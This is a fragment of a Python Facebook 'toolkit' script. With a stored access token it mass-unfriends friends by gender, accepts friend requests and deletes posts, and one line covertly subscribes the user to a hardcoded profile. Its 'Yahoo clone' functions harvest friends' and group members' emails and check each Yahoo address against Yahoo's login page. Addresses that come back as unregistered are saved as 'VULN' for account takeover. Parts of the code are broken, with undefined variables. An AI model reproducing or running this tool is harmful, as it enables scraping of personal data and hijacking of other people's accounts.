        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print("[!] Token not found")
        os.system('rm -rf cookie/login.txt')
        sleep(1)
        login()
    print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
    ugen=input('[?] Gender F/M: ')
    if ugen == 'F' or ugen == 'f':
        gen = 'female'
    elif ugen == 'M' or ugen == 'm':
        gen = 'male'
    else:
        print('STUPID!')
    print('[?] Press [CTRL + C] to aborting')
    tik('[!] Start....')
    print(a)
    try:
        lon = []
        req = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
        tok = json.loads(req.text)
        for i in tok['data']:
            lon.append(i['id'])
            try:
                ref = requests.get('https://graph.facebook.com/'+i['id']+'?access_token=' + toket)
                res = json.loads(ref.text)
                if gen == res['gender']:
                    unf = requests.delete("https://graph.facebook.com/me/friends?uid="+i['id']+"&access_token="+toket)
                    if unf.text == 'true':
                        print(k+"["+R+str(len(lon))+k+"] "+res['name']+k+' - ['+h+'SUCCESS'+k+']')
                    else:
                        print(k+"["+R+str(len(lon))+k+"] "+res['name']+k+' - ['+R+'FAILED'+k+'] ')
            except KeyError:
                print(f"[Failed] {i['id']} - (unknow)")
    except KeyError:
        exit('hhhh')
def req():
    print(a)
    tik('['+h+' A C C E P T   R E Q U E S T S '+k+']')
    print('')
    try:
        toket=open('cookie/login.txt','r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except FileNotFoundError:
        print('[!] Token not found')
        input('[!] Press [Enter] to generate access token')
        toke()
    print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
    lov = []
    s = requests.Session()
    print(a)
    tik('[✔] START...')
    r = s.get('https://graph.facebook.com/me/friendrequests?limit=5000&access_token='+toket);s.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
    res = json.loads(r.text)
    if '[]' in str(res['data']):
        print("[!] no friends requests")
        input('[!] Press [Enter] to return ')
        mbot()
    for i in res['data']:
        re = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(i['from']['id'],toket))
        b  = json.loads(re.text)
        if 'error' in str(b):
            print(R+"[x] "+k+i['from']['name']+R+' - FAILED ')
        else:
            print(k+"[✔] "+k+i['from']['name']+h+" - CONFIRMED")
    print(k,a)
    print('[✔] DONE ')
    input('[✔] Press [Enter] to return ')
    mbot()
def dyah():
    em = []
    try:
        tik('[!] Load Token....')
        toket=open('cookie/login.txt','r').read()
        print('[✔] Token Founded')
    except FileNotFoundError:
        print('[!] Token not found')
        input('[!] Press [Enter] to return ')
        toke()
    try:
        r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
        a = json.loads(r.text)
        for i in a['data']:
            olx=open('dump/Ymail.txt','a')
            x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
            z = json.loads(x.text)
            try:
                em.append(z['email'])
                if '@yahoo' in z['email']:
                    olx=open('dump/Ymail.txt','a')
                    olx.write(z['email'])
                    olx.close()
                    print(k+"[Yahoo] "+z['email'] +' - '+h+z['name'])
            except:
                pass
        print("""[FILE SAVED]
            Yahoo: dump/Ymail.txt""")
    except requests.exceptions.ConnectionError:
        exit('[ CHECK YOUR CONNECTION ]')
def delpost():
    print(a)
    try:
        toket=open('cookie/login.txt','r').read()
        na = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        lol = json.loads(na.text)
        nama = lol['name']
    except IOError:
        print("[!] Token not found")
        os.system('rm -rf cookie/login.txt')
        sleep(1)
        login()
    print("\033[1;91m[+] \033[1;92mFrom \033[1;91m: \033[1;97m%s"%nama)
    print('[!] Ctrl + d to abort ')
    tik("\033[1;91m[+] \033[1;92mStart\033[1;97m ...")
    print(a)
    asu = requests.get('https://graph.facebook.com/me/feed?&access_token='+toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/'+id+'?method=delete&access_token='+toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print('\033[1;91m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;91m] \033[1;95mFailed')
        except TypeError:
            print('\033[1;92m[\033[1;97m'+id[:10].replace('\n',' ')+'...'+'\033[1;92m] \033[1;96mDeleted')
            piro += 1
        except requests.exceptions.ConnectionError:
            print("\033[1;91m[!] Connection Error")
            input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
            mbot()
    print("\033[1;91m [✓] \033[1;92mDone")
    input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
    mbot()
def clone():
    os.system('clear')
    logo()
    print('                Yahoo clone ')
    print(a)
    print('''    [ 01 ] Friends
    [ 02 ] From Friends
    [ 03 ] From Group
    [ 04 ] From File
    [ 05 ] Dump Yahoo
    [ 00 ] Back
    ''')
    yah = input(R+'[#]'+n+' Asmin'+k+'/'+n+'Yahoo'+k+'/'+R+'~'+k+'> ')
    if yah =='':
        print('[!] Please input your choice ')
        input('[!] Press [Enter] to return ')
        clone()
    elif yah in ['1','01']:
        friend()
    elif yah in ['2','02']:
        fr_friend()
    elif yah in ['3','03']:
        fr_grub()
    elif yah in ['4','04']:
        fil()
    elif yah in ['5','05']:
        dyah()
    elif yah in ['0','00']:
        login()
    else:
        print('[!] Wrong input')
        input('[!] Press [Enter] to return ')
        clone()
def friend():
        print(a)
        try:
            toket=open('cookie/login.txt','r').read()
        except IOError:
                print("\033[1;91m[!] Token not found")
                os.system('rm -rf cookie/login.txt')
                time.sleep(1)
                toke()
        try:
                os.mkdir('clone')
        except OSError:
                pass
        mpsh = []
        jml = 0
        tik('[!] Getting email friend...')
        teman = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
        br = mechanize.Browser()
        br.set_handle_robots(False)
        kimak = json.loads(teman.text)
        for i in kimak['data']:
            try:
               em = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
               mail = json.loads(em.text)
               for o in mail['data']:
                   yah = o['mail']
            except KeyError:
                continue
            if ('yahoo.com' in yah):pass
            else: continue
            br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
            br._factory.is_html = True
            br.select_form(nr=0)
            br["username"] = (em)
            soup = BeautifulSoup(br.submit().read(), features="html.parser")
            status = soup.find_all("p")
            vuln = ("\033[31mNot Vuln")
            for p in status:
                try:
                    if (p.get("data-error") == "messages.ERROR_INVALID_USERNAME"):
                        vuln = ("\033[32mVuln")
                        break
                except:
                    pass
            len_email = (27-len(em))
            if (vuln == "\033[32mVuln"):
                len_vuln = (19-(len(vuln)-8))
                if (vuln == "\033[32mVuln"):
                    len_vuln = (19-(len(vuln)-8))
                    print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-10)*" "+vuln+(len_vuln-10)*" "+"\033[36m|")
                else:
                    len_vuln = (19-(len(vuln)-8))
                    print ("\033[36m|"+(em)+len_email*" "+"|"+(len_vuln-7)*" "+vuln+(len_vuln-9)*" "+"\033[36m|")
        print('[✔] Done ')
        print("[+] Total : "+str(len(berhasil)))
        print("[+] File saved : clone/friends.txt")
        save.close()
        input('[+] Press [Enter] to return ')
        clone()
def fr_grub():
    print(a+k)
    try:
        toket=open('cookie/login.txt','r').read()
    except IOError:
        print("\033[1;91m[!] Token not found")
        os.system('rm -rf cookie/login.txt')
        time.sleep(1)
        toke()
    try:
        os.mkdir('clone')
    except OSError:
        pass
    mpsh = []
    jml = 0
    id=input('[?] Input ID group : ')
    try:
        r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
        asw=json.loads(r.text)
        print("[+] From group : "+asw['name'])
    except KeyError:
        print("[!] Group not found")
        input('[!] Press [Enter] to return ')
        clone()
    tik('[+] Getting email from group...')
    teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
    kimak = json.loads(teman.text)
    save = open('clone/fromgroup','a')
    tik('[+] Start...')
    for w in kimak['data']:
        jml +=1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
        z = json.loads(links.text)
        try:
            print('[!] Try pertama ')
            mail = z['email']
            yahoo = re.compile(r'@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                print('[otw]> '+otw)
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                br._factory.is_html = True
                br.select_form(nr=0)
                br["username"] = mail
                klik = br.submit().read()
                print('[klik] '+klik)
                jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    print('[!] try kedua')
                    pek = jok.search(klik).group()
                except:
                    print('[!] except kedua')
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print('['+h+'VULN'+k+']' +mail+'|'+nama)
                    berhasil.append(mail)
        except KeyError:
            print('[!] Except pertama')
            pass
    print('[✓] Done....')
    print("[+] Total : "+str(len(berhasil)))
    print("[+] File saved : clone/fromgroup.txt")
    save.close()
    input('[+] Press [Enter] to return ')
    clone()
def fil():
    print(a)
    try:
        toket=open('cookie/login.txt','r').read()
    except IOError:
        print("\033[1;91m[!] Token not found")
        os.system('rm -rf login.txt')
        time.sleep(1)
        toke()
    try:
        os.mkdir('clone')
    except OSError:
        pass
    files = input("[+] File path : ")
    try:
        total = open(files,"r")
        mail = total.readlines()
    except IOError:
        print("[!] File not found")
        input('[!] Press [Enter] to return ')
        clone()
    mpsh = []
    jml = 0
    tik('Start...')
    save = open('clone/file.txt','a')
    mail = open(files,"r").readlines()
    for pw in mail:
        mail = pw.replace("\n","")
        jml +=1
        mpsh.append(jml)
        yahoo = re.compile(r'@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
            br._factory.is_html = True
            br.select_form(nr=0)
            br["username"] = mail
            klik = br.submit().read()
            jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue
            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print('['+h+'VULN'+k+']' +mail+'|'+nama)
                berhasil.append(mail)
        print('[✓] Done')
        print("[+] Total : "+ str(len(berhasil)))
        print("[+] File saved : clone/file.txt")
        save.close()
        input('[+] Press [Enter] to return ')
        clone()
def fr_friend():
    print(a)
    try:
        toket=open('cookie/login.txt','r').read()
    except IOError:
        print("[!] Token not found")
        os.system('rm -rf cookie/login.txt')
        time.sleep(1)
        toke()
    try:
        os.mkdir('clone')
    except OSError:
        pass
    mpsh = []
    jml = 0
    idt = input("[+] Input ID friend : ")
    try:
        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
        op = json.loads(jok.text)
        print('[✓] Clone From '+op["name"])
    except KeyError:
        print("[!] Friend not found")
        input("Press [Enter] ti return ")
        clone()
    tik('[+] Getting email from friend...')
    teman = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
    kimak = json.loads(teman.text)
    save = open('clone/fromfriend.txt','a')
    tik('[+] Start...')
    for w in kimak['data']:
        jml +=1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile(r'@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
                br._factory.is_html = True
                br.select_form(nr=0)
                br["username"] = mail
                klik = br.submit().read()
                jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue
                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write(mail + '\n')
                    print('['+h+'VULN'+k+']' +mail+'|'+nama)
                    berhasil.append(mail)
        except KeyError:
            pass
    print('[✓] Done ')
    print("[+] Total : "+str(len(berhasil)))
    print("[+] File saved : clone/fromfriend.txt")
    save.close()
    input('[+] Press [Enter] to return ')
    clone()
if __name__ == '__main__':
    log()
